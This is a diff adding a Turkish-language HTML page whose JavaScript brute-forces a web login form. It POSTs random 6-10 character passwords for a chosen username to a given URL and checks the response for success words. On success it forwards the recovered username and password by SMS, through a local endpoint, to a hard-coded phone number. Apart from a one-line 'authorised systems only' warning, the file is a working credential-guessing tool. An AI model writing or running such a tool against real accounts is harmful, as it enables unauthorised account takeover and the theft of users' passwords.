@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <title>903-NY1X</title>
+  <style>
+    body { font-family: Arial, sans-serif; background:#121212; color:#eee; padding:20px; }
+    input, button { width: 100%; padding: 10px; margin: 8px 0; border-radius: 5px; border:none; }
+    button { background:#007bff; color:#fff; font-weight: bold; cursor: pointer; }
+    .log { background:#222; max-height: 300px; overflow-y: auto; padding:10px; margin-top:10px; border-radius:5px; white-space: pre-line; }
+  </style>
+</head>
+<body>
+  <h2>🔐 En Az 6 Karakter Harf+Sayı Şifre Deneme (50 Adet)</h2>
+  <p><strong>Dikkat!</strong> Sadece izinli olduğun sistemlerde kullan.</p>
+
+  <label>Giriş Sayfası URL (POST yapılacak):</label>
+  <input id="site" type="text" placeholder="http://localhost:3000/login" autocomplete="off" />
+
+  <label>Kullanıcı Adı:</label>
+  <input id="username" type="text" placeholder="Kullanıcı adı" autocomplete="off" />
+
+  <button onclick="basla()">Denemeye Başla</button>
+
+  <div id="log" class="log"></div>
+
+  <script>
+    const karakterler = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+
+    function rastgeleSifre() {
+      const uzunluk = Math.floor(Math.random() * 5) + 6; // 6-10 karakter
+      let sifre = "";
+      for (let i = 0; i < uzunluk; i++) {
+        const rast = Math.floor(Math.random() * karakterler.length);
+        sifre += karakterler[rast];
+      }
+      return sifre;
+    }
+
+    async function basla() {
+      const site = document.getElementById("site").value.trim();
+      const username = document.getElementById("username").value.trim();
+      const log = document.getElementById("log");
+      log.innerHTML = "";
+
+      if (!site || !username) {
+        alert("Lütfen site URL'si ve kullanıcı adını girin.");
+        return;
+      }
+
+      const denenenSifreler = new Set();
+
+      for (let i = 1; i <= 99999950; i++) {
+        let sifre;
+        do {
+          sifre = rastgeleSifre();
+        } while (denenenSifreler.has(sifre));
+        denenenSifreler.add(sifre);
+
+        log.innerHTML += `Deneme ${i}: Şifre = "${sifre}"... Deneniyor\n`;
+        log.scrollTop = log.scrollHeight;
+
+        const sonuc = await dene(site, username, sifre);
+
+        log.innerHTML += `Sonuç: ${sonuc}\n\n`;
+        log.scrollTop = log.scrollHeight;
+
+        if (sonuc === "✅ BAŞARILI") {
+          alert(`Şifre bulundu! Kullanıcı: ${username} Şifre: ${sifre}`);
+
+          // SMS gönderme isteği
+          try {
+            const smsResponse = await fetch("http://localhost:3000/sms-gonder", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                numara: "+905365717964",  // Buraya kendi telefon numaranı yaz
+                mesaj: `Kullanıcı: ${username}, Şifre: ${sifre}`
+              })
+            });
+            const smsSonuc = await smsResponse.json();
+            if (smsSonuc.success) {
+              log.innerHTML += `✅ SMS başarıyla gönderildi. SID: ${smsSonuc.sid}\n`;
+            } else {
+              log.innerHTML += `❌ SMS gönderilemedi: ${smsSonuc.error}\n`;
+            }
+          } catch(e) {
+            log.innerHTML += `⚠️ SMS gönderme hatası: ${e.message}\n`;
+          }
+
+          break;  // Doğru şifre bulundu, döngüyü durdur
+        }
+      }
+    }
+
+    async function dene(site, username, password) {
+      try {
+        const response = await fetch(site, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
+        });
+
+        const text = await response.text();
+
+        if (/giriş başarılı|hoş geldin|welcome/i.test(text)) {
+          return "✅ BAŞARILI";
+        }
+        return "❌ Başarısız";
+      } catch (e) {
+        return `⚠️ HATA: ${e.message}`;
+      }
+    }
+  </script>
+</body>
+</html>
